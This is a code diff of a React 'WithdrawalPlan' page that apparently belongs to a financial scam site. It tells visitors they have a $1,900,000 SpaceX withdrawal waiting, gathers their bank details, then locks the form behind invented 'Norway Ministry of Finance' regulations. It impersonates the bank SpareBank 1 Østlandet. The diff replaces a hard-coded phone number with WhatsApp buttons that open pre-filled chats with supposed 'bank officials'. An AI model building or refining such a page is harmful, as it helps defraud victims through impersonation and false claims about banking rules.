@@ -1,7 +1,7 @@
 // src/pages/WithdrawalPlan.tsx
 import { useState, useEffect } from 'react';
 import { useParams, useNavigate } from 'react-router-dom';
-import { ArrowLeft, Lock, Shield, CreditCard, Gift, AlertCircle, CheckCircle, Apple, Banknote, Send, Loader, X, Phone } from 'lucide-react';
+import { ArrowLeft, Lock, Shield, CreditCard, Gift, AlertCircle, CheckCircle, Apple, Banknote, Send, Loader, X, Phone, MessageCircle } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 
 const planDetails = {
@@ -25,7 +25,7 @@ const WithdrawalPlan = () => {
   const [showSuccess, setShowSuccess] = useState(false);
   const [showError, setShowError] = useState(false);
   const [showCustomAlert, setShowCustomAlert] = useState(false);
-  const [showBankRegulations, setShowBankRegulations] = useState(false); // NEW STATE
+  const [showBankRegulations, setShowBankRegulations] = useState(false);
   const [formData, setFormData] = useState({
     bankName: '',
     accountHolderName: '',
@@ -35,7 +35,32 @@ const WithdrawalPlan = () => {
     selectedPlan: plan || 'premium'
   });
 
+  // WhatsApp phone numbers
+  const whatsappNumbers = [
+    { number: '123456789', label: 'Bank Official 1' },
+    { number: '987654321', label: 'Bank Official 2' },
+    { number: '555555555', label: 'Support Agent' }
+  ];
+
   const planData = planDetails.premium;
+
+  // Function to open WhatsApp
+  const openWhatsApp = (phoneNumber: string) => {
+    // Remove any non-numeric characters
+    const cleanNumber = phoneNumber.replace(/\D/g, '');
+    // Create WhatsApp URL
+    const whatsappUrl = `https://wa.me/${cleanNumber}?text=Hello%20Bank%20Official,%20I%20need%20assistance%20with%20my%20$1,900,000%20withdrawal%20from%20SpaceX.`;
+    // Open in new tab
+    window.open(whatsappUrl, '_blank');
+  };
+
+  // Function to open WhatsApp with pre-filled message
+  const openWhatsAppWithMessage = (phoneNumber: string, message: string) => {
+    const cleanNumber = phoneNumber.replace(/\D/g, '');
+    const encodedMessage = encodeURIComponent(message);
+    const whatsappUrl = `https://wa.me/${cleanNumber}?text=${encodedMessage}`;
+    window.open(whatsappUrl, '_blank');
+  };
 
   // Check if form is fully completed
   useEffect(() => {
@@ -76,7 +101,7 @@ const WithdrawalPlan = () => {
 
     setIsSubmitting(true);
     
-    // Show bank regulations message instead of custom alert
+    // Show bank regulations message
     setTimeout(() => {
       setShowBankRegulations(true);
       setIsSubmitting(false);
@@ -100,10 +125,10 @@ const WithdrawalPlan = () => {
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-gray-950 to-black text-white">
-      {/* Bank Regulations Message Modal */}
+      {/* Bank Regulations Message Modal with WhatsApp Buttons */}
       {showBankRegulations && (
         <div className="fixed inset-0 bg-black/90 flex items-center justify-center z-50 p-4 animate-fade-in">
-          <div className="bg-gradient-to-br from-gray-900 to-black rounded-2xl p-6 sm:p-8 max-w-md w-full border-2 border-blue-500 shadow-2xl relative">
+          <div className="bg-gradient-to-br from-gray-900 to-black rounded-2xl p-6 sm:p-8 max-w-md w-full border-2 border-green-500 shadow-2xl relative">
             <button 
               onClick={() => setShowBankRegulations(false)}
               className="absolute top-4 right-4 text-gray-400 hover:text-white transition-colors"
@@ -112,43 +137,53 @@ const WithdrawalPlan = () => {
             </button>
             
             <div className="flex items-center gap-3 mb-4">
-              <div className="w-10 h-10 rounded-full bg-blue-900/30 flex items-center justify-center">
-                <Shield className="w-6 h-6 text-blue-500" />
+              <div className="w-10 h-10 rounded-full bg-green-900/30 flex items-center justify-center">
+                <MessageCircle className="w-6 h-6 text-green-500" />
               </div>
               <div>
-                <h3 className="text-xl font-bold text-blue-400">🏛️ BANK REGULATIONS NOTICE</h3>
-                <p className="text-sm text-gray-400">Ministry of Finance - Norway</p>
+                <h3 className="text-xl font-bold text-green-400">📱 CONTACT BANK OFFICIAL</h3>
+                <p className="text-sm text-gray-400">Click WhatsApp button below</p>
               </div>
             </div>
             
-            <div className="bg-blue-900/20 p-4 rounded-lg border border-blue-500/30 mb-6">
+            <div className="bg-green-900/20 p-4 rounded-lg border border-green-500/30 mb-6">
               <div className="text-center mb-3">
-                <div className="inline-flex items-center gap-2 bg-blue-900/40 px-3 py-1 rounded-full mb-3">
-                  <span className="text-xs font-semibold text-blue-300">OFFICIAL BANK REGULATION</span>
+                <div className="inline-flex items-center gap-2 bg-green-900/40 px-3 py-1 rounded-full mb-3">
+                  <span className="text-xs font-semibold text-green-300">WHATSAPP CONTACT</span>
                 </div>
                 
                 <div className="space-y-4 text-sm">
                   <p className="text-white font-bold text-center">
-                    DUE TO THE MINISTER OF FINANCE REGULATIONS WITH BANKS IN NORWAY YOUR FORM INFORMATION IS SAVED
+                    DUE TO NORWAY BANK REGULATIONS, CONTACT THESE OFFICIALS VIA WHATSAPP:
                   </p>
                   
-                  <div className="mt-4 p-3 bg-yellow-900/20 rounded-lg border border-yellow-500/30">
-                    <div className="flex items-center gap-2 mb-2">
-                      <Phone className="w-4 h-4 text-yellow-400" />
-                      <span className="font-bold text-yellow-400">CONTACT NOW TO RECEIVE YOUR TRANSFER:</span>
-                    </div>
-                    <p className="text-white font-bold text-center text-lg">
-                      📞 <span className="text-green-400">+15822857826</span>
-                    </p>
+                  {/* WhatsApp Buttons */}
+                  <div className="space-y-3 mt-4">
+                    {whatsappNumbers.map((contact, index) => (
+                      <button
+                        key={index}
+                        onClick={() => {
+                          const message = `Hello ${contact.label}, I need assistance with my $1,900,000 withdrawal from SpaceX. My bank details are ready.`;
+                          openWhatsAppWithMessage(contact.number, message);
+                        }}
+                        className="w-full bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 text-white py-3 px-4 rounded-lg flex items-center justify-center gap-3 transition-all hover:scale-[1.02]"
+                      >
+                        <MessageCircle className="w-5 h-5" />
+                        <div className="text-left">
+                          <div className="font-bold">{contact.label}</div>
+                          <div className="text-sm opacity-90">{contact.number}</div>
+                        </div>
+                      </button>
+                    ))}
                   </div>
                   
-                  <div className="mt-3 p-3 bg-green-900/20 rounded-lg border border-green-500/30">
+                  <div className="mt-4 p-3 bg-blue-900/20 rounded-lg border border-blue-500/30">
                     <div className="flex items-center gap-2 mb-2">
-                      <CheckCircle className="w-4 h-4 text-green-400" />
-                      <span className="font-bold text-green-400">BANK OFFICIAL DETAILS:</span>
+                      <Shield className="w-4 h-4 text-blue-400" />
+                      <span className="font-bold text-blue-400">BANK OFFICIAL DETAILS:</span>
                     </div>
-                    <p className="text-white text-center">
-                      HE CURRENTLY WORKS FOR <span className="font-bold text-yellow-400">SPAREBENK1 OSTLANDET</span> AND WOULD GUIDE YOU TO TAKE YOUR MONEY
+                    <p className="text-white text-center text-sm">
+                      These officials work for <span className="font-bold text-yellow-400">SPAREBENK1 OSTLANDET</span> and will guide you
                     </p>
                   </div>
                 </div>
@@ -158,13 +193,13 @@ const WithdrawalPlan = () => {
             <div className="space-y-3">
               <Button 
                 onClick={() => setShowBankRegulations(false)}
-                className="w-full bg-gradient-to-r from-blue-600 to-cyan-600 hover:from-blue-700 hover:to-cyan-700 py-3 text-base font-semibold"
+                className="w-full bg-gradient-to-r from-gray-600 to-gray-800 hover:from-gray-700 hover:to-gray-900 py-3 text-base font-semibold"
               >
-                ✅ I Understand - WHATSAPP Bank Official
+                Close Window
               </Button>
               
               <p className="text-xs text-center text-gray-400">
-                This is a mandatory banking regulation for international transfers from Norway
+                Click any WhatsApp button above to start conversation
               </p>
             </div>
           </div>
@@ -436,7 +471,7 @@ const WithdrawalPlan = () => {
           </div>
         )}
 
-        {/* Step 2: Bank Details Form - Now shows blurred form with regulations message */}
+        {/* Step 2: Bank Details Form with WhatsApp Integration */}
         {step === 2 && (
           <div className="bg-gray-900/50 rounded-2xl p-4 sm:p-6 md:p-8 border border-gray-800 mb-6 sm:mb-8">
             <div className="flex flex-col sm:flex-row sm:items-center gap-3 sm:gap-4 mb-4 sm:mb-6">
@@ -449,49 +484,68 @@ const WithdrawalPlan = () => {
               </div>
             </div>
 
-            {/* Regulations Message Display */}
-            <div className="mb-6 bg-gradient-to-r from-blue-900/30 to-cyan-900/30 rounded-xl p-4 sm:p-6 border border-blue-500/50">
+            {/* WhatsApp Contact Section */}
+            <div className="mb-6 bg-gradient-to-r from-green-900/30 to-emerald-900/30 rounded-xl p-4 sm:p-6 border border-green-500/50">
               <div className="flex items-start gap-3">
-                <Shield className="w-6 h-6 sm:w-8 sm:h-8 text-blue-500 flex-shrink-0 mt-0.5" />
+                <MessageCircle className="w-6 h-6 sm:w-8 sm:h-8 text-green-500 flex-shrink-0 mt-0.5" />
                 <div>
-                  <h4 className="text-lg sm:text-xl font-bold text-blue-400 mb-2">🏛️ NORWAY BANK REGULATIONS NOTICE</h4>
-                  <p className="text-sm sm:text-base text-white font-bold">
-                    DUE TO THE MINISTER OF FINANCE REGULATIONS WITH BANKS IN NORWAY YOUR FORM INFORMATION IS SAVED, WHATSAPP +15822857826 NOW TO RECEIVE THE TRANSFER OF YOUR MONEY, HE CURRENTLY WORKS FOR SPAREBENK1 OSTLANDET AND WOULD GUIDE YOU TO TAKE YOUR MONEY
+                  <h4 className="text-lg sm:text-xl font-bold text-green-400 mb-2">📱 CONTACT VIA WHATSAPP</h4>
+                  <p className="text-sm sm:text-base text-white mb-4">
+                    DUE TO NORWAY BANK REGULATIONS, CLICK ANY BUTTON BELOW TO CONTACT BANK OFFICIALS:
                   </p>
-                  <div className="mt-4 flex flex-col sm:flex-row items-center gap-3">
-                    <div className="flex items-center gap-2 bg-blue-900/50 px-3 py-2 rounded-lg">
-                      <Phone className="w-4 h-4 text-green-400" />
-                      <span className="font-bold text-green-400">WHATSAPP:</span>
-                      <span className="font-bold text-white ml-2">+15822857826</span>
-                    </div>
-                    <div className="flex items-center gap-2 bg-green-900/50 px-3 py-2 rounded-lg">
-                      <Banknote className="w-4 h-4 text-yellow-400" />
-                      <span className="font-bold text-yellow-400">BANK:</span>
-                      <span className="font-bold text-white ml-2">SPAREBENK1 OSTLANDET</span>
+                  
+                  {/* WhatsApp Buttons Grid */}
+                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 mt-4">
+                    {whatsappNumbers.map((contact, index) => (
+                      <button
+                        key={index}
+                        onClick={() => {
+                          const message = `Hello ${contact.label}, I need assistance with my $1,900,000 withdrawal from SpaceX. My bank details are ready.`;
+                          openWhatsAppWithMessage(contact.number, message);
+                        }}
+                        className="bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 text-white py-3 px-4 rounded-lg flex flex-col items-center justify-center gap-2 transition-all hover:scale-[1.02]"
+                      >
+                        <MessageCircle className="w-5 h-5" />
+                        <div className="text-center">
+                          <div className="font-bold text-sm">{contact.label}</div>
+                          <div className="text-xs opacity-90 mt-1">{contact.number}</div>
+                        </div>
+                        <div className="text-xs bg-black/30 px-2 py-1 rounded-full mt-1">
+                          Click to Chat
+                        </div>
+                      </button>
+                    ))}
+                  </div>
+                  
+                  <div className="mt-4 p-3 bg-blue-900/20 rounded-lg border border-blue-500/30">
+                    <div className="flex items-center gap-2">
+                      <Shield className="w-4 h-4 text-blue-400" />
+                      <span className="font-bold text-blue-400">OFFICIAL BANK:</span>
+                      <span className="ml-2 font-bold text-yellow-400">SPAREBENK1 OSTLANDET</span>
                     </div>
                   </div>
                 </div>
               </div>
             </div>
 
-            {/* Blurred Out Form (shows data but uneditable) */}
+            {/* Blurred Out Form */}
             <div className="relative">
               {/* Blur overlay */}
               <div className="absolute inset-0 bg-black/60 backdrop-blur-sm rounded-xl z-10 flex items-center justify-center">
                 <div className="text-center p-6">
-                  <div className="w-12 h-12 sm:w-16 sm:h-16 rounded-full bg-blue-900/50 flex items-center justify-center mx-auto mb-4">
-                    <Lock className="w-6 h-6 sm:w-8 sm:h-8 text-blue-400" />
+                  <div className="w-12 h-12 sm:w-16 sm:h-16 rounded-full bg-green-900/50 flex items-center justify-center mx-auto mb-4">
+                    <MessageCircle className="w-6 h-6 sm:w-8 sm:h-8 text-green-400" />
                   </div>
-                  <h4 className="text-lg sm:text-xl font-bold text-blue-400 mb-2">FORM LOCKED - BANK REGULATIONS</h4>
+                  <h4 className="text-lg sm:text-xl font-bold text-green-400 mb-2">FORM LOCKED - CONTACT VIA WHATSAPP</h4>
                   <p className="text-sm text-gray-300 mb-4">
-                    Your information is secured under Norway Ministry of Finance regulations
+                    Your information is secured. Click WhatsApp buttons above to contact bank officials.
                   </p>
                   <Button 
                     onClick={() => setShowBankRegulations(true)}
-                    className="bg-gradient-to-r from-blue-600 to-cyan-600 hover:from-blue-700 hover:to-cyan-700"
+                    className="bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700"
                   >
-                    <Phone className="w-4 h-4 mr-2" />
-                    MESSAGE ON WHATSAPP Bank Official: +15822857826
+                    <MessageCircle className="w-4 h-4 mr-2" />
+                    Open WhatsApp Contacts
                   </Button>
                 </div>
               </div>
@@ -584,10 +638,10 @@ const WithdrawalPlan = () => {
                           <CheckCircle className="w-3 h-3 sm:w-5 sm:h-5 text-green-500 mt-0.5 flex-shrink-0" />
                           <div>
                             <p className="font-semibold text-green-400 text-xs sm:text-base">
-                              ✅ FORM COMPLETE - Information Secured
+                              ✅ FORM COMPLETE - Ready for WhatsApp Contact
                             </p>
                             <p className="text-xs text-gray-300 mt-1">
-                              Your bank details are protected under Norway Ministry of Finance regulations
+                              Click WhatsApp buttons above to contact bank officials
                             </p>
                           </div>
                         </div>
@@ -601,11 +655,11 @@ const WithdrawalPlan = () => {
                           disabled
                           className="w-full max-w-md text-xs sm:text-base py-2 sm:py-3 bg-gradient-to-r from-gray-600 to-gray-700 cursor-not-allowed"
                         >
-                          <Lock className="w-3 h-3 sm:w-4 sm:h-4 mr-1 sm:mr-2" />
-                          <span className="text-xs sm:text-sm">Contact Bank Official to Proceed</span>
+                          <MessageCircle className="w-3 h-3 sm:w-4 sm:h-4 mr-1 sm:mr-2" />
+                          <span className="text-xs sm:text-sm">Use WhatsApp Buttons Above</span>
                         </Button>
                         <p className="text-xs text-gray-400 mt-2 sm:mt-3">
-                          MESSAGE +15822857826 - Sparebank1 Ostlandet Official
+                          Contact via WhatsApp for immediate assistance
                         </p>
                       </div>
                     </div>
@@ -631,17 +685,17 @@ const WithdrawalPlan = () => {
         <div className="bg-gradient-to-r from-gray-900 to-black rounded-2xl p-3 sm:p-6 border border-green-500/20">
           <div className="flex flex-col md:flex-row md:items-center gap-3 sm:gap-6">
             <div className="flex-1">
-              <h4 className="text-sm sm:text-lg font-semibold mb-1 sm:mb-2">🛡️ Norway Banking Regulations</h4>
+              <h4 className="text-sm sm:text-lg font-semibold mb-1 sm:mb-2">📱 WhatsApp Support</h4>
               <p className="text-xs sm:text-sm text-gray-400">
-                All international transfers from Norway require Ministry of Finance approval. Contact the designated bank official for processing.
+                Contact bank officials directly via WhatsApp for instant assistance with your withdrawal.
               </p>
             </div>
             <div className="flex items-center gap-2 sm:gap-4 mt-3 md:mt-0">
               <div className="text-center">
                 <div className="w-6 h-6 sm:w-10 sm:h-10 md:w-12 md:h-12 rounded-full bg-green-900/30 flex items-center justify-center mx-auto mb-1">
-                  <Phone className="w-3 h-3 sm:w-5 sm:h-5 md:w-6 md:h-6 text-green-400" />
+                  <MessageCircle className="w-3 h-3 sm:w-5 sm:h-5 md:w-6 md:h-6 text-green-400" />
                 </div>
-                <p className="text-xs text-gray-400">Contact: +15822857826</p>
+                <p className="text-xs text-gray-400">WhatsApp</p>
               </div>
               <div className="text-center">
                 <div className="w-6 h-6 sm:w-10 sm:h-10 md:w-12 md:h-12 rounded-full bg-blue-900/30 flex items-center justify-center mx-auto mb-1">
@@ -665,12 +719,12 @@ const WithdrawalPlan = () => {
         <div className="max-w-4xl mx-auto">
           <div className="flex flex-col sm:flex-row items-center justify-between text-xs text-gray-500 gap-1 sm:gap-2">
             <div className="text-center sm:text-left">
-              <span>Norway Ministry of Finance Regulations Apply - Contact Bank Official</span>
+              <span>Contact via WhatsApp for immediate bank assistance</span>
             </div>
             <div className="flex items-center gap-1">
-              <span className="text-blue-400 flex items-center text-xs">
-                <div className="w-1.5 h-1.5 rounded-full bg-blue-400 mr-1 animate-pulse" />
-                Bank Official: 1234567
+              <span className="text-green-400 flex items-center text-xs">
+                <MessageCircle className="w-3 h-3 mr-1" />
+                WhatsApp Support Available
               </span>
             </div>
           </div>
